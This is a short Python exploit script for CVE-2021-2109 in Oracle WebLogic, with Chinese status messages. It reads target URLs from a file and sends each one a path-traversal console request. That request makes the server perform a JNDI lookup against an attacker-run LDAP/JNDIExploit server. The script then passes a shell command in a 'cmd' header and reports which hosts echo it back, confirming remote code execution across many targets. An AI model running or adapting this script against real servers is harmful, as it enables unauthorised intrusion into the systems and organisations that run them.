import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def CVE_2021_2109(target_url, ip):
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    target_url = target_url.strip()
    if not target_url.startswith('http'):
        vuln_url = 'http://' + target_url + f"/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://{'.'.join(ip.split('.')[:3])};{ip.split('.')[-1]}:1389/Basic/WeblogicEcho;AdminServer%22)"
    else:
        vuln_url = target_url + f"/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://{'.'.join(ip.split('.')[:3])};{ip.split('.')[-1]}:1389/Basic/WeblogicEcho;AdminServer%22)"
    headers = {'cmd': 'echo aaaaqqqq'}
    try:
        r = requests.get(vuln_url, headers=headers, verify=False, timeout=5)
        if 'aaaaqqqq' in r.text:
            print(f'\033[36m[+] {target_url}  存在CVE-2021-2109漏洞 \033[0m')
        else:
            print(f'\033[31m[x] {target_url}  利用失败 \033[0m')
    except Exception:
        print(f"\033[31m[x] {target_url}  请求超时 \033[0m")


if __name__ == '__main__':
    ip = str(input("\033[35m请输入运行JNDIExploit服务器ip >>> \033[0m"))
    with open('urls.txt')as f:
        ips = f.readlines()
        for i in ips:
            CVE_2021_2109(i, ip)

